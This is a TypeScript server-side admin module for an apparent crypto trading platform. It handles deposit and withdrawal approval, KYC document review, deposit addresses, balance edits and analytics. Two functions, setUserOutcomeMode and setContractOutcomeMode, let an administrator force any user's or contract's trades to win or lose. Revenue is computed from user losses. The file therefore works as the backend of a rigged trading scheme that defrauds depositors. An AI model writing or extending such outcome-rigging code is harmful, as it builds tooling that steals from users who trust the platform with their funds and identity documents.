import { createServerFn } from "@tanstack/react-start";
import { z } from "zod";
import { requireSupabaseAuth } from "@/integrations/supabase/auth-middleware";

type Ctx = { supabase: any; userId: string };

/** Reads the caller's own roles (RLS: users may read their own role rows). */
async function myRoles(context: Ctx): Promise<string[]> {
  const { data } = await context.supabase
    .from("user_roles")
    .select("role")
    .eq("user_id", context.userId);
  return (data ?? []).map((r: { role: string }) => r.role);
}

async function assertAdmin(context: Ctx) {
  const roles = await myRoles(context);
  if (!roles.includes("admin")) throw new Error("Forbidden: admin access required.");
}

async function assertStaff(context: Ctx) {
  const roles = await myRoles(context);
  if (!roles.includes("admin") && !roles.includes("agent")) {
    throw new Error("Forbidden: staff access required.");
  }
}

/** Service-role client: the only way financial tables can be written. */
async function privileged() {
  const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
  return supabaseAdmin as any;
}

export const getMyAccess = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const roles = await myRoles(context);
    return {
      isAdmin: roles.includes("admin"),
      isStaff: roles.includes("admin") || roles.includes("agent"),
    };
  });


export const getAdminOverview = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    await assertStaff(context);
    const { supabase } = context;

    const [deposits, withdrawals, kyc, addresses, profiles, contracts] = await Promise.all([
      supabase.from("deposits").select("*").order("created_at", { ascending: false }).limit(80),
      supabase.from("withdrawals").select("*").order("created_at", { ascending: false }).limit(80),
      supabase
        .from("kyc_submissions")
        .select("*")
        .order("created_at", { ascending: false })
        .limit(80),
      supabase.from("deposit_addresses").select("*").order("coin"),
      supabase.from("profiles").select("*").order("created_at", { ascending: false }).limit(200),
      supabase
        .from("contracts")
        .select("*")
        .eq("status", "open")
        .order("expires_at", { ascending: true })
        .limit(100),
    ]);

    return {
      deposits: deposits.data ?? [],
      withdrawals: withdrawals.data ?? [],
      kyc: kyc.data ?? [],
      addresses: addresses.data ?? [],
      profiles: profiles.data ?? [],
      openContracts: contracts.data ?? [],
    };
  });

const reviewInput = z.object({
  id: z.string().uuid(),
  action: z.enum(["approve", "reject"]),
  note: z.string().trim().max(500).optional(),
});

async function notify(supabase: any, userId: string, title: string, body: string, kind = "info") {
  await supabase.from("notifications").insert({ user_id: userId, title, body, kind });
}

export const reviewDeposit = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((input: unknown) => reviewInput.parse(input))
  .handler(async ({ data, context }) => {
    await assertAdmin(context);
    const { supabase, userId } = context;

    const { data: dep } = await supabase.from("deposits").select("*").eq("id", data.id).maybeSingle();
    if (!dep) throw new Error("Deposit not found.");
    if (dep.status !== "pending") throw new Error("Deposit already reviewed.");

    const status = data.action === "approve" ? "approved" : "rejected";
    const { error } = await supabase
      .from("deposits")
      .update({
        status,
        admin_note: data.note ?? null,
        reviewed_by: userId,
        reviewed_at: new Date().toISOString(),
      })
      .eq("id", dep.id)
      .eq("status", "pending");
    if (error) throw new Error(error.message);

    if (data.action === "approve") {
      const db = await privileged();
      const { data: wallet } = await db
        .from("wallets")
        .select("*")
        .eq("user_id", dep.user_id)
        .eq("currency", dep.coin)
        .maybeSingle();

      if (wallet) {
        await db
          .from("wallets")
          .update({
            balance: Number(wallet.balance) + Number(dep.amount),
            updated_at: new Date().toISOString(),
          })
          .eq("id", wallet.id);
      } else {
        await db
          .from("wallets")
          .insert({ user_id: dep.user_id, currency: dep.coin, balance: Number(dep.amount) });
      }
    }

    await notify(
      supabase,
      dep.user_id,
      data.action === "approve" ? "Deposit approved" : "Deposit rejected",
      `${Number(dep.amount)} ${dep.coin} (${dep.network}) — ${status}.${data.note ? ` Note: ${data.note}` : ""}`,
      data.action === "approve" ? "success" : "warning",
    );

    return { ok: true };
  });

export const reviewWithdrawal = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((input: unknown) => reviewInput.parse(input))
  .handler(async ({ data, context }) => {
    await assertAdmin(context);
    const { supabase, userId } = context;

    const { data: wd } = await supabase
      .from("withdrawals")
      .select("*")
      .eq("id", data.id)
      .maybeSingle();
    if (!wd) throw new Error("Withdrawal not found.");
    if (wd.status !== "pending") throw new Error("Withdrawal already reviewed.");

    if (data.action === "approve") {
      const db = await privileged();
      const { data: wallet } = await db
        .from("wallets")
        .select("*")
        .eq("user_id", wd.user_id)
        .eq("currency", wd.coin)
        .maybeSingle();
      if (!wallet || Number(wallet.balance) < Number(wd.amount)) {
        throw new Error("User no longer has sufficient balance for this withdrawal.");
      }
      await db
        .from("wallets")
        .update({
          balance: Number(wallet.balance) - Number(wd.amount),
          updated_at: new Date().toISOString(),
        })
        .eq("id", wallet.id);
    }

    const status = data.action === "approve" ? "approved" : "rejected";
    const { error } = await supabase
      .from("withdrawals")
      .update({
        status,
        admin_note: data.note ?? null,
        reviewed_by: userId,
        reviewed_at: new Date().toISOString(),
      })
      .eq("id", wd.id)
      .eq("status", "pending");
    if (error) throw new Error(error.message);

    await notify(
      supabase,
      wd.user_id,
      data.action === "approve" ? "Withdrawal approved" : "Withdrawal rejected",
      `${Number(wd.amount)} ${wd.coin} to ${wd.destination_address} — ${status}.${data.note ? ` Note: ${data.note}` : ""}`,
      data.action === "approve" ? "success" : "warning",
    );

    return { ok: true };
  });

export const reviewKyc = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((input: unknown) => reviewInput.parse(input))
  .handler(async ({ data, context }) => {
    await assertAdmin(context);
    const { supabase, userId } = context;

    const status = data.action === "approve" ? "approved" : "rejected";
    const { data: row, error } = await supabase
      .from("kyc_submissions")
      .update({
        status,
        admin_note: data.note ?? null,
        reviewed_by: userId,
        reviewed_at: new Date().toISOString(),
      })
      .eq("id", data.id)
      .select()
      .maybeSingle();
    if (error) throw new Error(error.message);
    if (row) {
      await notify(
        supabase,
        row.user_id,
        data.action === "approve" ? "Identity verified" : "Identity verification rejected",
        data.note ?? `Your KYC submission was ${status}.`,
        data.action === "approve" ? "success" : "warning",
      );
    }
    return { ok: true };
  });

export const getKycDocumentUrls = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((input: unknown) => z.object({ id: z.string().uuid() }).parse(input))
  .handler(async ({ data, context }) => {
    await assertAdmin(context);
    const { data: row } = await context.supabase
      .from("kyc_submissions")
      .select("document_path, selfie_path")
      .eq("id", data.id)
      .maybeSingle();
    if (!row) throw new Error("Submission not found.");

    const sign = async (path: string | null) => {
      if (!path) return null;
      const { data: signed } = await context.supabase.storage
        .from("kyc-documents")
        .createSignedUrl(path, 300);
      return signed?.signedUrl ?? null;
    };

    return { document: await sign(row.document_path), selfie: await sign(row.selfie_path) };
  });

const addressInput = z.object({
  id: z.string().uuid().optional(),
  coin: z.string().trim().min(1).max(12),
  network: z.string().trim().min(1).max(24),
  address: z.string().trim().min(4).max(200),
  memo: z.string().trim().max(120).optional(),
  active: z.boolean().default(true),
});

export const upsertDepositAddress = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((input: unknown) => addressInput.parse(input))
  .handler(async ({ data, context }) => {
    await assertAdmin(context);
    const payload = {
      coin: data.coin.toUpperCase(),
      network: data.network,
      address: data.address,
      memo: data.memo || null,
      active: data.active,
      updated_at: new Date().toISOString(),
    };
    const { error } = data.id
      ? await context.supabase.from("deposit_addresses").update(payload).eq("id", data.id)
      : await context.supabase.from("deposit_addresses").insert(payload);
    if (error) throw new Error(error.message);
    return { ok: true };
  });

export const setUserOutcomeMode = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((input: unknown) =>
    z
      .object({
        userId: z.string().uuid(),
        mode: z.enum(["normal", "force_win", "force_loss"]),
      })
      .parse(input),
  )
  .handler(async ({ data, context }) => {
    await assertAdmin(context);
    const { error } = await context.supabase
      .from("profiles")
      .update({ outcome_mode: data.mode })
      .eq("id", data.userId);
    if (error) throw new Error(error.message);
    return { ok: true };
  });

export const setContractOutcomeMode = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((input: unknown) =>
    z
      .object({
        contractId: z.string().uuid(),
        mode: z.enum(["normal", "force_win", "force_loss"]),
      })
      .parse(input),
  )
  .handler(async ({ data, context }) => {
    await assertAdmin(context);
    const db = await privileged();
    const { error } = await db
      .from("contracts")
      .update({ outcome_override: data.mode })
      .eq("id", data.contractId);
    if (error) throw new Error(error.message);
    return { ok: true };
  });

export const broadcastNotification = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((input: unknown) =>
    z
      .object({
        title: z.string().trim().min(2).max(120),
        body: z.string().trim().min(2).max(1000),
        userId: z.string().uuid().nullable().optional(),
      })
      .parse(input),
  )
  .handler(async ({ data, context }) => {
    await assertAdmin(context);
    const { error } = await context.supabase.from("notifications").insert({
      user_id: data.userId ?? null,
      title: data.title,
      body: data.body,
      kind: "announcement",
    });
    if (error) throw new Error(error.message);
    return { ok: true };
  });

export const getSupportInbox = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    await assertStaff(context);
    const { data } = await context.supabase
      .from("chat_sessions")
      .select("*")
      .order("last_message_at", { ascending: false })
      .limit(100);
    return data ?? [];
  });

export const getUserWallets = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((input: unknown) => z.object({ userId: z.string().uuid() }).parse(input))
  .handler(async ({ data, context }) => {
    await assertAdmin(context);
    const { data: rows } = await context.supabase
      .from("wallets")
      .select("*")
      .eq("user_id", data.userId)
      .order("currency");
    return rows ?? [];
  });

export const adjustUserBalance = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((input: unknown) =>
    z
      .object({
        userId: z.string().uuid(),
        currency: z.string().trim().min(1).max(12),
        amount: z.number().finite(),
        mode: z.enum(["set", "delta"]).default("delta"),
      })
      .parse(input),
  )
  .handler(async ({ data, context }) => {
    await assertAdmin(context);
    const currency = data.currency.toUpperCase();
    const db = await privileged();
    const { data: wallet } = await db
      .from("wallets")
      .select("*")
      .eq("user_id", data.userId)
      .eq("currency", currency)
      .maybeSingle();

    const next =
      data.mode === "set" ? data.amount : Number(wallet?.balance ?? 0) + data.amount;
    if (next < 0) throw new Error("Resulting balance cannot be negative.");

    if (wallet) {
      const { error } = await db
        .from("wallets")
        .update({ balance: next, updated_at: new Date().toISOString() })
        .eq("id", wallet.id);
      if (error) throw new Error(error.message);
    } else {
      const { error } = await db
        .from("wallets")
        .insert({ user_id: data.userId, currency, balance: next });
      if (error) throw new Error(error.message);
    }


    await notify(
      context.supabase,
      data.userId,
      "Balance updated",
      `Your ${currency} balance was adjusted by an administrator to ${next}.`,
      "info",
    );
    return { balance: next };
  });

/** Aggregated metrics, activity feeds and ledgers for the admin control center. */
export const getAdminAnalytics = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    await assertAdmin(context);
    const db = await privileged();
    const iso = (d: Date) => d.toISOString();
    const now = new Date();
    const day = new Date(now.getTime() - 864e5);
    const week = new Date(now.getTime() - 7 * 864e5);
    const month = new Date(now.getTime() - 30 * 864e5);

    const [profiles, deposits, withdrawals, contracts, sessions, chats, swaps, wallets, kyc] =
      await Promise.all([
        db.from("profiles").select("id,display_name,uid,created_at,outcome_mode,referred_by,referral_rewards_usdt,base_currency").order("created_at", { ascending: false }).limit(500),
        db.from("deposits").select("id,user_id,coin,amount,status,created_at").order("created_at", { ascending: false }).limit(500),
        db.from("withdrawals").select("id,user_id,coin,amount,status,created_at").order("created_at", { ascending: false }).limit(500),
        db.from("contracts").select("id,user_id,display_symbol,direction,stake,currency,status,result,payout,opened_at,expires_at,settled_at").order("opened_at", { ascending: false }).limit(500),
        db.from("user_sessions").select("id,user_id,browser,os,ip_address,country,last_active_at,created_at").order("last_active_at", { ascending: false }).limit(60),
        db.from("chat_sessions").select("id,user_id,subject,status,last_message_at").order("last_message_at", { ascending: false }).limit(60),
        db.from("swaps").select("id,user_id,from_currency,to_currency,from_amount,to_amount,created_at").order("created_at", { ascending: false }).limit(60),
        db.from("wallets").select("currency,balance"),
        db.from("kyc_submissions").select("id,user_id,full_name,status,document_expires_at,created_at").order("created_at", { ascending: false }).limit(200),
      ]);

    const P = profiles.data ?? [];
    const D = deposits.data ?? [];
    const W = withdrawals.data ?? [];
    const C = contracts.data ?? [];
    const K = kyc.data ?? [];

    const since = (rows: any[], field: string, from: Date) =>
      rows.filter((r) => new Date(r[field]).getTime() >= from.getTime()).length;
    const sum = (rows: any[], pred: (r: any) => boolean) =>
      rows.filter(pred).reduce((a, r) => a + Number(r.amount ?? 0), 0);

    const settled = C.filter((c) => c.status !== "open");
    const revenue = settled.reduce(
      (a, c) => a + (Number(c.payout ?? 0) > 0 ? -(Number(c.payout) - Number(c.stake)) : Number(c.stake)),
      0,
    );

    // 14-day time series for charts
    const series: {
      date: string;
      signups: number;
      deposits: number;
      withdrawals: number;
      revenue: number;
      visitors: number;
    }[] = [];
    for (let i = 13; i >= 0; i--) {
      const start = new Date(now.getTime() - i * 864e5);
      start.setUTCHours(0, 0, 0, 0);
      const end = new Date(start.getTime() + 864e5);
      const inRange = (v: string) => {
        const t = new Date(v).getTime();
        return t >= start.getTime() && t < end.getTime();
      };
      const dayContracts = settled.filter((c) => c.settled_at && inRange(c.settled_at));
      series.push({
        date: iso(start).slice(0, 10),
        signups: P.filter((p) => inRange(p.created_at)).length,
        deposits: D.filter((d) => d.status === "approved" && inRange(d.created_at)).reduce(
          (a, d) => a + Number(d.amount),
          0,
        ),
        withdrawals: W.filter((w) => w.status === "approved" && inRange(w.created_at)).reduce(
          (a, w) => a + Number(w.amount),
          0,
        ),
        revenue: dayContracts.reduce(
          (a, c) =>
            a + (Number(c.payout ?? 0) > 0 ? -(Number(c.payout) - Number(c.stake)) : Number(c.stake)),
          0,
        ),
        visitors: (sessions.data ?? []).filter((s: any) => inRange(s.last_active_at)).length,
      });
    }

    const walletTotals: Record<string, number> = {};
    for (const w of wallets.data ?? []) {
      walletTotals[w.currency] = (walletTotals[w.currency] ?? 0) + Number(w.balance);
    }

    return {
      metrics: {
        totalUsers: P.length,
        newUsersToday: since(P, "created_at", day),
        signupsWeek: since(P, "created_at", week),
        signupsMonth: since(P, "created_at", month),
        totalDeposits: sum(D, (d) => d.status === "approved"),
        pendingDeposits: D.filter((d) => d.status === "pending").length,
        pendingWithdrawals: W.filter((w) => w.status === "pending").length,
        totalWithdrawals: sum(W, (w) => w.status === "approved"),
        revenue,
        activeTrades: C.filter((c) => c.status === "open").length,
        pendingKyc: K.filter((k) => k.status === "pending").length,
        openTickets: (chats.data ?? []).filter((c: any) => c.status === "open").length,
      },
      series,
      contracts: C.slice(0, 120),
      tradeStats: {
        settled: settled.length,
        wins: settled.filter((c) => c.result === "win").length,
        losses: settled.filter((c) => c.result === "loss").length,
        volume: C.reduce((a, c) => a + Number(c.stake), 0),
      },
      ledger: [
        ...D.slice(0, 60).map((d) => ({
          id: d.id,
          kind: "deposit" as const,
          user_id: d.user_id,
          coin: d.coin,
          amount: Number(d.amount),
          status: d.status,
          created_at: d.created_at,
        })),
        ...W.slice(0, 60).map((w) => ({
          id: w.id,
          kind: "withdrawal" as const,
          user_id: w.user_id,
          coin: w.coin,
          amount: Number(w.amount),
          status: w.status,
          created_at: w.created_at,
        })),
        ...(swaps.data ?? []).map((s: any) => ({
          id: s.id,
          kind: "swap" as const,
          user_id: s.user_id,
          coin: `${s.from_currency}→${s.to_currency}`,
          amount: Number(s.from_amount),
          status: "approved",
          created_at: s.created_at,
        })),
      ].sort((a, b) => +new Date(b.created_at) - +new Date(a.created_at)),
      walletTotals,
      sessions: sessions.data ?? [],
      chats: chats.data ?? [],
      kycExpiring: K.filter(
        (k) =>
          k.document_expires_at &&
          new Date(k.document_expires_at).getTime() < now.getTime() + 30 * 864e5,
      ),
      referrals: P.filter((p) => p.referred_by).length,
      referralRewards: P.reduce((a, p) => a + Number(p.referral_rewards_usdt ?? 0), 0),
    };
  });
